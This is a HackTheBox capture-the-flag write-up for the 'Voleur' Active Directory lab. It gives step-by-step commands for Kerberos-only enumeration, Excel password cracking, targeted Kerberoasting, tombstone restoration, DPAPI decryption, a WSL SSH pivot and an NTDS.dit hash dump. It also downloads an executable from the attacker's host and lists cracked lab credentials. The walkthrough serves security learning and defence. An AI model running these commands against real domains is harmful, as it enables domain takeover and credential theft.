---
title: "HTB Voleur — NTLM Disabled, Excel Blueprint, DPAPI & WSL NTDS Backup"
date: 2026-06-26
categories: [HackTheBox, Active Directory]
tags: [htb, active-directory, kerberos, kerberoasting, dpapi, wsl, tombstone-restoration, excel-cracking, ntds, bloodhound, windows]
classes: wide
header:
  image: /assets/images/VOLEUR/voleur.png
  teaser: /assets/images/VOLEUR/voleur.png
---

<style>
p { text-align: justify; }
</style>

# HTB Voleur

**Difficulty:** Medium  
**OS:** Windows Server 2022 (Domain Controller) + WSL Ubuntu  
**Platform:** HackTheBox  
**Category:** Active Directory  
**Status:** Retired

---

## Overview

Voleur is a Windows DC box where NTLM is completely disabled and every single tool needs Kerberos tickets(This was quite something for me and i really enjoyed this box(^o^)丿 ). What makes this box stand out is that someone on the IT team stored a password-protected Excel spreadsheet on an internal share that documents every service account password, every user permission, and even notes about who to talk to for what. That spreadsheet is the blueprint for the entire chain. From there it's Kerberoasting, tombstone restoration, DPAPI decryption, WSL pivot, and a secretsdump from a backup of NTDS.dit.

---

## Reconnaissance

### Starting Credentials

Given: `ryan.naylor:HollowOct31Nyt`

```bash
nxc smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt' --shares
# STATUS_NOT_SUPPORTED
```

NTLM is disabled domain-wide. Every interaction from here needs a Kerberos ticket.

### Port Scan

```bash
nmap -sV -sC -T4 -p- --min-rate 10000 10.129.232.130
```

```
PORT     STATE SERVICE
53/tcp   open  dns
88/tcp   open  kerberos-sec
389/tcp  open  ldap
445/tcp  open  microsoft-ds
2222/tcp open  OpenSSH 8.2p1 (Ubuntu)
5985/tcp open  WinRM
```

Port 2222 running Ubuntu SSH on a Windows DC is WSL (Windows Subsystem for Linux). Filed for later — that becomes the final pivot point.

---

### Kerberos Setup

Since NTLM is disabled, every tool needs proper Kerberos configuration and a valid TGT before it'll do anything:

```bash
echo "10.129.232.130 dc.voleur.htb voleur.htb dc" | sudo tee -a /etc/hosts

sudo tee /etc/krb5.conf << 'EOF'
[libdefaults]
 dns_lookup_kdc = false
 dns_lookup_realm = false
 default_realm = VOLEUR.HTB
[realms]
 VOLEUR.HTB = {
  kdc = dc.voleur.htb
  admin_server = dc.voleur.htb
  default_domain = voleur.htb
 }
[domain_realm]
 .voleur.htb = VOLEUR.HTB
 voleur.htb = VOLEUR.HTB
EOF

faketime '2026-06-26 00:36:00' impacket-getTGT \
  voleur.htb/ryan.naylor:'HollowOct31Nyt' -dc-ip 10.129.232.130

export KRB5CCNAME=ryan.naylor.ccache
```

`faketime` throughout because `ntpdate` kept syncing the clock but Kali reverted it. Wrapping individual commands is cleaner than fighting the system clock.

---

### SMB Enumeration with Kerberos

```bash
faketime '2026-06-26 00:38:00' nxc smb dc.voleur.htb -k --use-kcache --shares
```

Shares with READ access: Finance, HR, IT.

```bash
faketime '2026-06-26 00:39:00' nxc smb dc.voleur.htb -k --use-kcache \
  --spider IT --regex . --depth 3
```
![spider](/assets/images/VOLEUR/spider.png)
Found: `IT/First-Line Support/Access_Review.xlsx`

---

## The Blueprint — Cracking the Excel File

### Downloading the File

Standard smbclient with password auth fails because NTLM is disabled. nxc with `-k` handles Kerberos properly:

```bash
faketime '2026-06-26 00:58:00' nxc smb dc.voleur.htb \
  -u ryan.naylor -p 'HollowOct31Nyt' -d voleur.htb -k \
  --share IT --get-file 'First-Line Support\Access_Review.xlsx' Access_Review.xlsx
```

### Cracking the Password

```bash
office2john Access_Review.xlsx > access.hash
john access.hash --wordlist=/usr/share/wordlists/rockyou.txt
# football1
```
![Crack](/assets/images/VOLEUR/passwd.png)

Using LibreOffic Calc, we view the document


### What's Inside
![Excel](/assets/images/VOLEUR/spider.png)

The spreadsheet documented the entire support team structure, permissions, and credentials:

| User | Role | Notes |
|---|---|---|
| ryan.naylor | First-Line Support | Kerberos Pre-Auth disabled |
| Todd.Wolfe | Second-Line Support | Leaver. Password: NightT1meP1dg3on14 |
| Jeremy.Combs | Third-Line Support | Has access to Software folder |
| svc_ldap | Service Account | Password: M1XyC9pW7qT5Vn |
| svc_iis | Service Account | Password: N5pXyW1VqM7CZ8 |
| svc_winrm | Service Account | Need to ask Lacey |
| svc_backup | Service Account | Speak to Jeremy! |

This spreadsheet mapped every step. Whoever put this on a shared drive handed us the domain.

---

## Lateral Movement — Kerberoasting svc_winrm

### BloodHound

```bash
bloodhound-python -d voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' \
  -ns 10.129.232.130 -c All --zip
```

Key finding: `svc_ldap` has `WriteSPN` over `svc_winrm`. Add an SPN to svc_winrm, Kerberoast it, crack offline.

### Getting svc_ldap's TGT

NTLM disabled means we need a ticket even to modify AD objects:

```bash
faketime '2026-06-26 01:30:00' impacket-getTGT \
  voleur.htb/svc_ldap -dc-ip 10.129.232.130
# Password: M1XyC9pW7qT5Vn
export KRB5CCNAME=svc_ldap.ccache
```

### Finding the Correct DN

Service accounts aren't always in `CN=Users`. Always verify before modifying:

```bash
faketime '2026-06-26 01:35:00' bloodyad -d voleur.htb -u 'svc_ldap' \
  -p 'M1XyC9pW7qT5Vn' --host dc.voleur.htb -k \
  get object 'svc_winrm' --attr '*'
# CN=svc_winrm,OU=Service Accounts,DC=voleur,DC=htb
```

### Adding the SPN and Kerberoasting

```bash
faketime '2026-06-26 01:37:00' bloodyad -d voleur.htb -u 'svc_ldap' \
  -p 'M1XyC9pW7qT5Vn' --host dc.voleur.htb -k \
  set object 'CN=svc_winrm,OU=Service Accounts,DC=voleur,DC=htb' \
  servicePrincipalName -v 'HTTP/fake.voleur.htb'

faketime '2026-06-26 01:39:00' impacket-GetUserSPNs \
  voleur.htb/svc_ldap -k -no-pass \
  -dc-ip 10.129.232.130 -dc-host dc.voleur.htb \
  -request-user svc_winrm
```
![wpasswd](/assets/images/VOLEUR/winrm-passwd.png)

```bash
hashcat -m 13100 svc_winrm.hash /usr/share/wordlists/rockyou.txt --force -O
# AFireInsidedeOzarctica980219afi
```

---

## User Flag

```bash
faketime '2026-06-26 04:17:00' impacket-getTGT \
  voleur.htb/svc_winrm -dc-ip 10.129.232.130
export KRB5CCNAME=svc_winrm.ccache

faketime '2026-06-26 04:18:00' evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
```

```powershell
type C:\Users\svc_winrm\Desktop\user.txt
[REDACTED]
```

**User flag captured.** ✅

---

## Lateral Movement — Todd's Tombstone and DPAPI

### Restoring Todd from the AD Tombstone

BloodHound showed `svc_ldap` is in the "Restore Users" group, meaning it can restore deleted AD objects. Todd Wolfe was a leaver whose account was deleted — but his password is in the spreadsheet.

`svc_ldap` can't WinRM, but `svc_winrm` can. RunasCs lets us execute commands as `svc_ldap` from within the `svc_winrm` shell:

```powershell
Invoke-WebRequest -Uri 'http://10.10.16.32:8080/RunasCs.exe' -OutFile 'RunasCs.exe'

.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn "whoami"
# voleur\svc_ldap

.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Get-ADObject -Filter 'isDeleted -eq `$true' -IncludeDeletedObjects -Properties distinguishedName,Name -SearchBase 'CN=Deleted Objects,DC=voleur,DC=htb'"

.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Restore-ADObject 'CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb'"
```
![RESURRECTION](/assets/images/VOLEUR/restore.png)

Todd is back. Password from the spreadsheet: `NightT1meP1dg3on14`

---

### Accessing Todd's Archived Profile

When users leave, their data gets archived before the account is deleted. Todd's profile was copied to `IT/Second-Line Support/Archived Users/todd.wolfe/`. Windows stores encrypted credentials in two specific locations:

- `AppData\Roaming\Microsoft\Credentials` — encrypted credential blobs
- `AppData\Roaming\Microsoft\Protect\<SID>` — DPAPI master keys that decrypt them

```bash
faketime '2026-06-26 04:25:00' impacket-getTGT \
  voleur.htb/todd.wolfe -dc-ip 10.129.232.130
# Password: NightT1meP1dg3on14
export KRB5CCNAME=todd.wolfe.ccache

faketime '2026-06-26 04:25:00' impacket-smbclient -k todd.wolfe@dc.voleur.htb
```

```
> use IT
> cd Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials
> get 772275FAD58525253490A9B0039791D3
> cd ../Protect/S-1-5-21-3927696377-1337352550-2781715495-1110
> get 08949382-134f-4c63-b93c-ce52efc0aa88
```

### Decrypting DPAPI Credentials

```bash
impacket-dpapi masterkey \
  -file 08949382-134f-4c63-b93c-ce52efc0aa88 \
  -sid S-1-5-21-3927696377-1337352550-2781715495-1110 \
  -password NightT1meP1dg3on14

impacket-dpapi credential \
  -file 772275FAD58525253490A9B0039791D3 \
  -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```
![DPAPI](/assets/images/VOLEUR/dpapi.png)
Output: `jeremy.combs:qT3V9pLXyN7W4m`

The spreadsheet said Jeremy has access to the Software folder and is the point of contact for `svc_backup`. That note just became a path to root.

---

## Privilege Escalation — WSL and NTDS Backup

### Jeremy's Folder

```bash
faketime '2026-06-26 04:30:00' impacket-getTGT \
  voleur.htb/jeremy.combs -dc-ip 10.129.232.130
export KRB5CCNAME=jeremy.combs.ccache

faketime '2026-06-26 04:30:00' evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
```

```powershell
cd "C:\IT\Third-Line Support"
type Note.txt
# "I've had enough of Windows Backup! I've part configured WSL..."
download id_rsa
```
![SSH](/assets/images/VOLEUR/ssh.png)
The note explains Admin was migrating from Windows Backup to Linux tools via WSL. Port 2222 from the initial nmap scan was the WSL SSH server. The SSH key was sitting right there.

### SSH into WSL

```bash
chmod 600 id_rsa
ssh -i id_rsa svc_backup@10.129.232.130 -p 2222
```

Linux shell. On a Windows DC. WSL mounts the Windows filesystem under `/mnt/c/` — the entire Windows drive is accessible from here.

### Extracting the Backup Files

```bash
cd /mnt/c/IT/Third-Line\ Support/Backups/
ls
# Active Directory/   registry/
```

The NTDS.dit, SYSTEM, and SECURITY files from a Windows Backup were copied here during the migration to Linux tooling. Downloaded via SCP:

```bash
scp -i id_rsa -P 2222 \
  "svc_backup@10.129.232.130:/mnt/c/IT/Third-Line\ Support/Backups/registry/SECURITY" ./SECURITY

scp -i id_rsa -P 2222 \
  "svc_backup@10.129.232.130:/mnt/c/IT/Third-Line\ Support/Backups/registry/SYSTEM" ./SYSTEM

scp -i id_rsa -P 2222 \
  "svc_backup@10.129.232.130:/mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/ntds.dit" ./ntds.dit
```

### Dumping the Hashes

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
```
![SECRET](/assets/images/VOLEUR/secret.png)
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
```

---

## Root Flag

```bash
faketime '2026-06-26 04:45:00' impacket-getTGT \
  voleur.htb/administrator \
  -hashes :e656e07c56d831611b577b160b259ad2 \
  -dc-ip 10.129.232.130
export KRB5CCNAME=administrator.ccache

faketime '2026-06-26 05:32:00' evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
[REDACTED]
```

**Root flag captured. Domain pwned.** ✅

---

## Full Attack Chain

```
ryan.naylor:HollowOct31Nyt (given)
  |
  Kerberos TGT -> IT share -> Access_Review.xlsx
  -> crack (football1) -> blueprint for entire chain
     |
     svc_ldap:M1XyC9pW7qT5Vn (from spreadsheet)
       |
       WriteSPN over svc_winrm -> add SPN -> Kerberoast
       -> AFireInsidedeOzarctica980219afi
          |
          evil-winrm -> USER FLAG
          |
          svc_ldap in "Restore Users" -> RunasCs from svc_winrm shell
          -> Restore Todd.Wolfe from tombstone (NightT1meP1dg3on14)
             |
             Todd's archived profile -> DPAPI masterkey + credential blob
             -> decrypt -> jeremy.combs:qT3V9pLXyN7W4m
                |
                C:\IT\Third-Line Support\ -> Note.txt + id_rsa
                -> SSH svc_backup@WSL:2222
                   |
                   /mnt/c/ -> NTDS.dit + SYSTEM + SECURITY
                   -> secretsdump -> Administrator hash -> ROOT FLAG
```

---

## Credentials Found

| Username | Password | How Obtained |
|---|---|---|
| ryan.naylor | HollowOct31Nyt | Given |
| svc_ldap | M1XyC9pW7qT5Vn | Excel spreadsheet |
| svc_iis | N5pXyW1VqM7CZ8 | Excel spreadsheet |
| Todd.Wolfe | NightT1meP1dg3on14 | Excel spreadsheet |
| svc_winrm | AFireInsidedeOzarctica980219afi | Kerberoasting |
| jeremy.combs | qT3V9pLXyN7W4m | DPAPI decryption |
| Administrator | e656e07c... | NTDS.dit secretsdump |


## What Did We Learn?

**1. NTLM disabled means Kerberos for literally everything**  
Every tool needed `-k` flags, a valid TGT, and a proper `/etc/krb5.conf` before it would touch the domain. This is increasingly common in hardened enterprise environments. Getting comfortable with Kerberos-only auth is no longer optional.

**2. An internal spreadsheet can be a complete attack blueprint**  
Service account passwords, user permissions, and operational notes all in one password-protected Excel file on a readable share. The password protecting it was `football1`. Everything after cracking that file was execution, not discovery.

**3. Deleted AD objects are not gone**  
Tombstoned users persist in `CN=Deleted Objects` for a configurable period (default 180 days). If you know their password and someone has the Restore Users privilege, they come back. Todd's archived profile surviving his account deletion led directly to Jeremy's credentials.

**4. DPAPI secrets survive account deletion**  
Windows encrypts stored credentials with keys tied to the user's password and SID. When an account is archived rather than wiped, the credential blobs and master keys in `AppData\Roaming\Microsoft` stay readable with the original password.

**5. The "Restore Users" group is a dangerous privilege**  
Membership lets you revive deleted objects, inheriting their old group memberships and permissions. It should be treated like a privileged group and audited accordingly.

**6. WSL blurs the Windows and Linux boundary completely**  
An SSH server on port 2222 running Ubuntu on a Windows DC gave us a Linux shell with full access to `C:\` through `/mnt/c/`. Backup files that were locked to Windows backup APIs became freely copyable via SCP from the WSL side. If WSL is running on a DC, assume the filesystem is accessible.

**7. faketime is more reliable than fighting ntpdate**  
Kali's clock kept reverting after `ntpdate`. Wrapping Kerberos commands in `faketime` with the correct DC time bypassed the whole problem. For boxes with Kerberos-only auth, this becomes a workflow you need to have ready from the start.

---

<img src="https://media.giphy.com/media/v1.Y2lkPWVjZjA1ZTQ3eDVncXVlbmxocmhsa2I3ZHRma3BueXRkaXJvYzFib2pibDhpdDJqZiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/bk8UGCysurqC2gmJ0o/giphy.gif"
     style="width: 100%; height: auto;"
     alt="pwned">

*Written by 0x5h4q | [0x5h4q.github.io](https://0x5h4q.github.io)*
